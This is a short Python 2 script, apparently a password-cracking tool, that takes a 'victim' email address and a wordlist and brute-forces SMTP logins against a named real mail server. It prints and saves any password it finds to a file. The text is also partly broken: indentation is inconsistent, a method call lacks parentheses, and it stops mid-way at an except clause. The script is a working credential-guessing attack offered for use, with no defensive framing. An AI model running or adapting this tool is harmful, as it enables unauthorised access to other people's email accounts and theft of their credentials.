#!/usr/bin/python
# -*- coding: utf-8 -*-
 
try:
    import poplib, imaplib, smtplib, time, sys
    from imaplib import IMAP4
    from poplib import POP3
except ImportError:
    exit("You Might be using Old version of Python. Please upgrade it First...!")
 
 user = raw_input("[+] Victim net: ")
    passlist = raw_input("[+] Password List [pass.txt]: ")
    fn = open (passlist, "r")
    counting = fn.readlines()
    print "[+] Worldlist Length: %s " % len(counting)
    smtp_host = 'mailwg.netvision.net.il'
    smtp_port = 465
    session = smtplib.SMTP_SSL()
    session.connect(smtp_host, smtp_port)
    #session.ehlo()
    #session.starttls()
    session.ehlo
    print "Start cracking using netvision server.....\n\r"
    time.sleep(2)
    fn = open (passlist, 'r')
    for pass_file in fn:
        try:
            print "[+] Trying: {0}".format(pass_file)+"\n\r"
            y_g= session.login(user, pass_file[:-1])
            if (y_g == (235, '2.7.0 Accepted')):
                print "> Correct Password have been found....!\n\r"
                time.sleep(2)
                print "Email: {0}".format(user)+"\n\r"
                print "Password is: {0}".format(pass_file)+"\n\r\n\r\n\r"
                session.quit()
                fn.close()
                fw = open('Gmail.txt','w')
                fw.write(user+': '+pass_file)
                fw.close()
                print "Email and Password saved in Gmail.txt file.\n\r"
                exit()
        except smtplib.SMTPAuthenticationError:
